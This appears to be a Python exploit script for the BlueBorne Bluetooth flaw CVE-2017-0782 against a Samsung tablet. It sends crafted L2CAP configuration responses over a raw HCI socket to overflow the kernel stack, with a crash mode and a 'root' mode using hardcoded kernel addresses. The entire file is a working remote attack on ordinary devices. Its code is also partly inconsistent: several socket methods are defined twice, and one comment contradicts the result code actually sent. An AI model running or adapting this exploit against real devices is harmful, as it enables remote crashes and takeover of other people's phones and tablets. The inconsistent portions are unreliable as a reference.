#!/usr/bin/env python3
"""
CVE-2017-0782 — BlueBorne L2CAP Stack Overflow via Raw HCI
Target: Samsung SM-T377A (ARM32, 3.10.9, NO KASLR/PXN/canaries)

Uses raw HCI socket to send crafted L2CAP signaling frames, bypassing
the local kernel's L2CAP layer entirely. This is necessary because the
kernel intercepts L2CAP signaling on CID 0x0001.

Compile: N/A (Python)
Run on Kali: sudo python3 bluborne_hci.py 02:00:00:00:00:21 [crash|root]

Requires: pip3 install pwntools
"""

import socket
import struct
import sys
import time
import os

# ============================================================
# Target constants
# ============================================================
COMMIT_CREDS        = 0xC0054328
PREPARE_KERNEL_CRED = 0xC00548E0

# HCI constants
HCI_COMMAND_PKT  = 0x01
HCI_ACLDATA_PKT  = 0x02
HCI_EVENT_PKT    = 0x04

OGF_LINK_CTL     = 0x01
OCF_CREATE_CONN  = 0x0005
OCF_DISCONNECT   = 0x0006

EVT_CONN_COMPLETE    = 0x03
EVT_DISCONN_COMPLETE = 0x05
EVT_CMD_STATUS       = 0x0F
EVT_NUM_COMP_PKTS    = 0x13

# L2CAP
L2CAP_CID_SIG    = 0x0001
L2CAP_CONN_REQ   = 0x02
L2CAP_CONN_RSP   = 0x03
L2CAP_CONF_REQ   = 0x04
L2CAP_CONF_RSP   = 0x05
L2CAP_CONF_UNACCEPT = 0x0001
L2CAP_CONF_PENDING  = 0x0004
L2CAP_CONF_MTU   = 0x01
L2CAP_CONF_EFS   = 0x06

PSM_SDP = 0x0001
OUR_SCID = 0x0040

# ============================================================
# Raw HCI socket helpers
# ============================================================

class HCISocket:
    """Raw HCI socket for sending/receiving HCI packets."""

    def __init__(self, dev_id=0):
        self.dev_id = dev_id
        self.sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW,
                                   socket.BTPROTO_HCI)
        self.sock.bind((dev_id,))

        # HCI filter — must be exactly 14 bytes:
        # uint32_t type_mask + uint32_t event_mask[2] + uint16_t opcode
        import ctypes

        # Accept all packet types (commands, ACL data, events)
        type_mask = 0xFFFFFFFF
        event_mask1 = 0xFFFFFFFF
        event_mask2 = 0xFFFFFFFF
        opcode = 0x0000
        filt = struct.pack('<IIIh', type_mask, event_mask1, event_mask2, opcode)
        try:
            self.sock.setsockopt(0, 2, filt)
        except OSError as e:
            print(f'[!] setsockopt filter failed ({e}), trying raw bytes...')
            try:
                self.sock.setsockopt(0, 2, b'\xff' * 14)
            except OSError:
                print('[!] Filter set failed — continuing without filter')

        self.sock.settimeout(10)
        self.handle = None

    def send_raw(self, data):
        """Send raw bytes to HCI socket."""
        return self.sock.send(data)

    def send_cmd(self, ogf, ocf, data=b''):
        """Send HCI command."""
        opcode = (ogf << 10) | ocf
        pkt = struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(data)) + data
        return self.sock.send(pkt)

    def send_acl(self, handle, cid, data):
        """Send L2CAP data over ACL."""
        l2cap = struct.pack('<HH', len(data), cid) + data
        flags = 0x2  # PB=first automatically flushable
        acl_hdr = (handle & 0x0FFF) | (flags << 12)
        acl = struct.pack('<HH', acl_hdr, len(l2cap)) + l2cap
        pkt = bytes([HCI_ACLDATA_PKT]) + acl
        return self.sock.send(pkt)

    def recv_pkt(self, timeout=10):
        """Receive raw HCI packet."""
        self.sock.settimeout(timeout)
        try:
            data = self.sock.recv(1024)
        except socket.timeout:
            return None
        if not data:
            return None
        return data

    def recv_event(self, timeout=10):
        """Receive and parse an HCI event or ACL data."""
        data = self.recv_pkt(timeout)
        if data is None or len(data) < 1:
            return None

        pkt_type = data[0]
        if pkt_type == HCI_EVENT_PKT and len(data) >= 3:
            evt_code = data[1]
            evt_len = data[2]
            evt_data = data[3:3+evt_len]
            return ('event', evt_code, evt_data)
        elif pkt_type == HCI_ACLDATA_PKT and len(data) >= 5:
            acl_hdr = struct.unpack('<HH', data[1:5])
            handle = acl_hdr[0] & 0x0FFF
            acl_len = acl_hdr[1]
            acl_data = data[5:5+acl_len]
            if acl_len >= 4:
                l2cap_len, l2cap_cid = struct.unpack('<HH', acl_data[:4])
                l2cap_data = acl_data[4:4+l2cap_len]
                return ('acl', handle, l2cap_cid, l2cap_data)
            return ('acl_raw', handle, acl_data)
        return ('unknown', pkt_type, data)

    def create_connection(self, bdaddr):
        """Establish ACL connection to target using hcitool (more reliable)."""
        import subprocess

        print(f'[*] Creating ACL connection to {bdaddr} via hcitool...')
        try:
            # Use hcitool to create connection — handles all the HCI details
            result = subprocess.run(
                ['hcitool', 'cc', bdaddr],
                timeout=15, capture_output=True, text=True
            )
            if result.returncode != 0:
                print(f'[-] hcitool cc failed: {result.stderr.strip()}')
                return None
        except subprocess.TimeoutExpired:
            print('[-] hcitool cc timed out')
            return None
        except FileNotFoundError:
            print('[-] hcitool not found — install bluez')
            return None

        # Get the ACL handle from hci connection info
        time.sleep(0.5)
        try:
            result = subprocess.run(
                ['hcitool', 'con'],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split('\n'):
                if bdaddr.upper() in line.upper():
                    # Parse: "  > ACL 02:00:00:00:00:21 handle 11 state 1 lm MASTER"
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if p == 'handle' and i + 1 < len(parts):
                            handle = int(parts[i + 1])
                            print(f'[+] ACL connected! handle=0x{handle:04x}')
                            self.handle = handle
                            return handle
        except Exception as e:
            print(f'[-] Failed to get handle: {e}')

        print('[-] Could not determine ACL handle')
        return None

    def disconnect(self):
        """Disconnect ACL."""
        if self.handle:
            import subprocess
            try:
                subprocess.run(['hcitool', 'dc',
                               sys.argv[1],  # bdaddr
                               str(self.handle)],
                              capture_output=True, timeout=5)
            except Exception:
                pass

    def send_cmd(self, ogf, ocf, data=b''):
        """Send HCI command."""
        opcode = (ogf << 10) | ocf
        pkt = struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(data)) + data
        self.sock.send(pkt)

    def send_acl(self, handle, cid, data):
        """Send L2CAP data over ACL."""
        # L2CAP header: length(2) + CID(2)
        l2cap = struct.pack('<HH', len(data), cid) + data
        # ACL header: handle+flags(2) + length(2)
        flags = 0x2  # PB=first automatically flushable, BC=point-to-point
        acl_hdr = (handle & 0x0FFF) | (flags << 12)
        acl = struct.pack('<HH', acl_hdr, len(l2cap)) + l2cap
        pkt = bytes([HCI_ACLDATA_PKT]) + acl
        self.sock.send(pkt)

    def recv_event(self, timeout=10):
        """Receive and parse an HCI event or ACL data."""
        self.sock.settimeout(timeout)
        try:
            data = self.sock.recv(1024)
        except socket.timeout:
            return None

        if len(data) < 1:
            return None

        pkt_type = data[0]
        if pkt_type == HCI_EVENT_PKT and len(data) >= 3:
            evt_code = data[1]
            evt_len = data[2]
            evt_data = data[3:3+evt_len]
            return ('event', evt_code, evt_data)
        elif pkt_type == HCI_ACLDATA_PKT and len(data) >= 5:
            acl_hdr = struct.unpack('<HH', data[1:5])
            handle = acl_hdr[0] & 0x0FFF
            acl_len = acl_hdr[1]
            acl_data = data[5:5+acl_len]
            if acl_len >= 4:
                l2cap_len, l2cap_cid = struct.unpack('<HH', acl_data[:4])
                l2cap_data = acl_data[4:4+l2cap_len]
                return ('acl', handle, l2cap_cid, l2cap_data)
            return ('acl_raw', handle, acl_data)
        return ('unknown', data)

    def create_connection(self, bdaddr):
        """Establish ACL connection to target."""
        addr_bytes = bytes.fromhex(bdaddr.replace(':', ''))[::-1]  # reverse for LE
        # HCI_Create_Connection params:
        # BD_ADDR(6) + PacketType(2) + PageScanRepMode(1) + Reserved(1) +
        # ClockOffset(2) + AllowRoleSwitch(1)
        params = addr_bytes
        params += struct.pack('<H', 0xCC18)  # DM1|DH1|DM3|DH3|DM5|DH5
        params += bytes([0x02, 0x00])  # page scan rep R2, reserved
        params += struct.pack('<H', 0x0000)  # clock offset
        params += bytes([0x01])  # allow role switch

        print(f'[*] Sending HCI Create Connection to {bdaddr}...')
        self.send_cmd(OGF_LINK_CTL, OCF_CREATE_CONN, params)

        # Wait for Connection Complete event
        for _ in range(30):
            r = self.recv_event(timeout=2)
            if r is None:
                continue
            if r[0] == 'event':
                evt_code, evt_data = r[1], r[2]
                if evt_code == EVT_CONN_COMPLETE and len(evt_data) >= 11:
                    status = evt_data[0]
                    handle = struct.unpack('<H', evt_data[1:3])[0]
                    if status == 0:
                        print(f'[+] ACL connected! handle=0x{handle:04x}')
                        self.handle = handle
                        return handle
                    else:
                        print(f'[-] Connection failed: status=0x{status:02x}')
                        return None
                elif evt_code == EVT_CMD_STATUS:
                    status = evt_data[0]
                    if status != 0:
                        print(f'[-] Command status error: 0x{status:02x}')
                        return None

        print('[-] Connection timeout')
        return None

    def disconnect(self):
        """Disconnect ACL."""
        if self.handle:
            params = struct.pack('<HB', self.handle, 0x13)  # reason: remote user terminated
            self.send_cmd(OGF_LINK_CTL, OCF_DISCONNECT, params)

# ============================================================
# L2CAP signaling builders
# ============================================================

def l2cap_cmd(code, ident, data):
    """Build L2CAP signaling command."""
    return struct.pack('<BBH', code, ident, len(data)) + data

def l2cap_conn_req(ident, psm, scid):
    return l2cap_cmd(L2CAP_CONN_REQ, ident,
                     struct.pack('<HH', psm, scid))

def l2cap_conf_rsp_overflow(ident, scid, overflow_addr):
    """Build the overflow CONF_RSP.

    Uses PENDING result (NO input length check in target kernel).
    Fills buf[64] then overflows with EFS options containing our address.

    l2cap_parse_conf_rsp writes options starting at buf+4 (after conf_req header).
    Each MTU option: type(1)+len(1)+val(2) = 4 bytes output
    Each EFS option: type(1)+len(1)+efs(16) = 18 bytes output

    15 MTU options = 60 bytes → fills buf[4..63]
    Then EFS options overflow into saved registers on ARM32 stack.
    """
    # CONF_RSP header: scid(2) + flags(2) + result(2)
    payload = struct.pack('<HHH', scid, 0x0000, L2CAP_CONF_PENDING)

    # Phase 1: Fill buf[4..63] with 15 MTU options (60 bytes)
    for _ in range(15):
        payload += bytes([L2CAP_CONF_MTU, 2, 0x00, 0x02])  # MTU=512

    # Phase 2: Overflow with EFS options containing target address
    # Each EFS = 18 bytes output with 16 bytes of controlled data
    addr_le = struct.pack('<I', overflow_addr)
    for _ in range(8):
        payload += bytes([L2CAP_CONF_EFS, 16])  # type + len
        payload += addr_le * 4  # 16 bytes = 4 copies of the address

    return l2cap_cmd(L2CAP_CONF_RSP, ident, payload)

# ============================================================
# Main exploit
# ============================================================

def exploit(target, mode='crash'):
    if mode == 'crash':
        overflow_addr = 0xDEADBEEF
        print('╔══════════════════════════════════════════════╗')
        print('║  CVE-2017-0782 — CRASH TEST (raw HCI)       ║')
        print('║  Target WILL REBOOT if overflow hits LR!     ║')
        print('╚══════════════════════════════════════════════╝')
    else:
        overflow_addr = PREPARE_KERNEL_CRED
        print('╔══════════════════════════════════════════════╗')
        print('║  CVE-2017-0782 — ROOT EXPLOIT (raw HCI)     ║')
        print('╚══════════════════════════════════════════════╝')

    print(f'Target:           {target}')
    print(f'Overflow addr:    0x{overflow_addr:08X}')
    print()

    # Step 1: Create HCI socket and ACL connection
    hci = HCISocket()
    handle = hci.create_connection(target)
    if handle is None:
        print('[-] ACL connection failed')
        return False

    time.sleep(0.3)

    # Step 2: Listen for target's L2CAP signaling and respond appropriately
    print('[*] Listening for target L2CAP signaling...')

    target_dcid = None
    conf_req_ident = None
    got_info_req = False
    sent_conn_req = False
    sent_exploit = False

    for iteration in range(60):  # up to 30 seconds (0.5s per loop)
        r = hci.recv_event(timeout=0.5)
        if r is None:
            # If we already answered info request but haven't sent conn_req, do it now
            if got_info_req and not sent_conn_req:
                print('[*] Sending L2CAP CONN_REQ (PSM=SDP, SCID=0x40)...')
                hci.send_acl(handle, L2CAP_CID_SIG,
                             l2cap_conn_req(0x01, PSM_SDP, OUR_SCID))
                sent_conn_req = True
            continue

        if r[0] == 'acl':
            _, rcv_handle, cid, data = r
            print(f'  [ACL] handle=0x{rcv_handle:04x} cid=0x{cid:04x} '
                  f'len={len(data)} data={data[:20].hex()}')

            if cid == L2CAP_CID_SIG and len(data) >= 4:
                sig_code = data[0]
                sig_ident = data[1]
                sig_len = struct.unpack('<H', data[2:4])[0]
                sig_data = data[4:4+sig_len]

                # Handle L2CAP_INFO_REQ — target asks for our features
                if sig_code == 0x0a:  # INFO_REQ
                    info_type = struct.unpack('<H', sig_data[0:2])[0] if len(sig_data) >= 2 else 0
                    print(f'  [SIG] INFO_REQ ident={sig_ident} type=0x{info_type:04x}')

                    if info_type == 0x0002:  # Extended features
                        # Respond with INFO_RSP: result=success + features mask
                        # Features: flow control, FCS, fixed channels, EFS
                        features = 0x000000B8  # typical features mask
                        info_rsp = struct.pack('<HHI', 0x0002, 0x0000, features)
                        hci.send_acl(handle, L2CAP_CID_SIG,
                                     l2cap_cmd(0x0b, sig_ident, info_rsp))  # INFO_RSP
                        print(f'  [>>>] Sent INFO_RSP (features=0x{features:08x})')
                        got_info_req = True

                    elif info_type == 0x0003:  # Fixed channels
                        # Respond with fixed channels supported (signaling + connectionless)
                        fixed_ch = b'\x02\x00\x00\x00\x00\x00\x00\x00'  # CID 1 (signaling)
                        info_rsp = struct.pack('<HH', 0x0003, 0x0000) + fixed_ch
                        hci.send_acl(handle, L2CAP_CID_SIG,
                                     l2cap_cmd(0x0b, sig_ident, info_rsp))
                        print(f'  [>>>] Sent INFO_RSP (fixed channels)')

                    else:
                        # Unknown type — respond with "not supported"
                        info_rsp = struct.pack('<HH', info_type, 0x0001)
                        hci.send_acl(handle, L2CAP_CID_SIG,
                                     l2cap_cmd(0x0b, sig_ident, info_rsp))
                        print(f'  [>>>] Sent INFO_RSP (not supported)')

                # Handle CONN_RSP
                elif sig_code == L2CAP_CONN_RSP and len(sig_data) >= 8:
                    dcid = struct.unpack('<H', sig_data[0:2])[0]
                    scid = struct.unpack('<H', sig_data[2:4])[0]
                    result = struct.unpack('<H', sig_data[4:6])[0]
                    status = struct.unpack('<H', sig_data[6:8])[0]
                    print(f'  [SIG] CONN_RSP dcid=0x{dcid:04x} scid=0x{scid:04x} '
                          f'result={result} status={status}')
                    if result == 0:
                        target_dcid = dcid
                    elif result == 1:  # pending
                        print('  [*] Connection pending, waiting...')

                # Handle CONF_REQ from target
                elif sig_code == L2CAP_CONF_REQ and len(sig_data) >= 4:
                    req_dcid = struct.unpack('<H', sig_data[0:2])[0]
                    flags = struct.unpack('<H', sig_data[2:4])[0]
                    options = sig_data[4:]
                    print(f'  [SIG] CONF_REQ dcid=0x{req_dcid:04x} flags=0x{flags:04x} '
                          f'ident={sig_ident} options={options.hex()}')
                    conf_req_ident = sig_ident

                    # Send normal CONF_RSP(SUCCESS) to target's CONF_REQ first
                    # This completes config from our side
                    conf_rsp_data = struct.pack('<HHH', OUR_SCID, 0x0000, 0x0000)  # success
                    hci.send_acl(handle, L2CAP_CID_SIG,
                                 l2cap_cmd(L2CAP_CONF_RSP, sig_ident, conf_rsp_data))
                    print(f'  [>>>] Sent CONF_RSP(SUCCESS) to target CONF_REQ')

                    # Also send our own CONF_REQ to target
                    if target_dcid:
                        our_conf = struct.pack('<HH', target_dcid, 0x0000)
                        our_conf += bytes([L2CAP_CONF_MTU, 2, 0x00, 0x02])  # MTU=512
                        hci.send_acl(handle, L2CAP_CID_SIG,
                                     l2cap_cmd(L2CAP_CONF_REQ, 0x03, our_conf))
                        print(f'  [>>>] Sent CONF_REQ to target (dcid=0x{target_dcid:04x})')

                # Handle CONF_RSP from target (response to OUR conf_req)
                elif sig_code == L2CAP_CONF_RSP and len(sig_data) >= 6:
                    rsp_scid = struct.unpack('<H', sig_data[0:2])[0]
                    rsp_flags = struct.unpack('<H', sig_data[2:4])[0]
                    rsp_result = struct.unpack('<H', sig_data[4:6])[0]
                    print(f'  [SIG] CONF_RSP scid=0x{rsp_scid:04x} result={rsp_result}')

                    if rsp_result == 0x0004:  # PENDING
                        print('  [!] Target sent CONF_RSP(PENDING) — CONF_LOC_CONF_PEND is set!')
                        print('  [!] This is the ideal state for overflow!')

                    # NOW send the overflow — target has processed config
                    if not sent_exploit and target_dcid:
                        print()
                        print(f'[*] Channel established! Sending overflow CONF_RSP...')
                        print(f'[!] Overflow addr: 0x{overflow_addr:08X}')
                        print('[!] *** SENDING IN 3 SECONDS — Ctrl+C to abort ***')
                        try:
                            for i in range(3, 0, -1):
                                print(f'[!] {i}...')
                                time.sleep(1)
                        except KeyboardInterrupt:
                            print('\n[*] Aborted.')
                            hci.disconnect()
                            return False

                        # Send crafted CONF_RSP with UNACCEPT result to trigger
                        # target to call l2cap_parse_conf_rsp on our data
                        overflow = l2cap_conf_rsp_overflow(0x03, target_dcid, overflow_addr)
                        hci.send_acl(handle, L2CAP_CID_SIG, overflow)
                        print('[+] OVERFLOW PAYLOAD SENT!')
                        sent_exploit = True

                        # Wait and check
                        time.sleep(5)
                        break

                else:
                    print(f'  [SIG] code=0x{sig_code:02x} ident={sig_ident} '
                          f'data={sig_data[:16].hex()}')

        elif r[0] == 'event':
            evt_code, evt_data = r[1], r[2]
            if evt_code == EVT_DISCONN_COMPLETE:
                print(f'  [EVT] Disconnect! reason=0x{evt_data[2]:02x}')
                break
            elif evt_code == EVT_NUM_COMP_PKTS:
                pass  # Ignore flow control events
            else:
                print(f'  [EVT] code=0x{evt_code:02x} data={evt_data[:10].hex()}')

    if not sent_exploit:
        if not got_info_req:
            print('[-] Never received INFO_REQ from target')
            print('    Try: sudo hciconfig hci0 down && sudo hciconfig hci0 up')
        elif not sent_conn_req:
            print('[-] Never sent CONN_REQ')
        elif target_dcid is None:
            print('[-] Never got CONN_RSP')
        elif conf_req_ident is None:
            print('[-] Never got CONF_REQ from target')
        else:
            print('[-] Exploit not sent for unknown reason')
        hci.disconnect()
        return False

    # Check if target is alive
    print('[*] Checking if target is alive...')
    echo = l2cap_cmd(0x08, 0x42, b'PING')
    hci.send_acl(handle, L2CAP_CID_SIG, echo)
    alive = False
    for _ in range(5):
        r = hci.recv_event(timeout=2)
        if r and r[0] in ('acl', 'event'):
            alive = True
            break

    if alive:
        print('[*] Target still responding — overflow may not have reached LR')
        print('[*] Try adjusting fill count or option types')
    else:
        print('[!] Target NOT responding!')
        if mode == 'crash':
            print('[+] *** CRASH CONFIRMED — vulnerability IS exploitable! ***')
        else:
            print('[+] Check device for root shell...')

    hci.disconnect()
    return not alive

if __name__ == '__main__':
    if os.geteuid() != 0:
        print('Need root. Run with: sudo python3 bluborne_hci.py ...')
        sys.exit(1)

    if len(sys.argv) < 2:
        print(f'Usage: sudo python3 {sys.argv[0]} <target_bdaddr> [crash|root]')
        sys.exit(1)

    target = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else 'crash'

    exploit(target, mode)
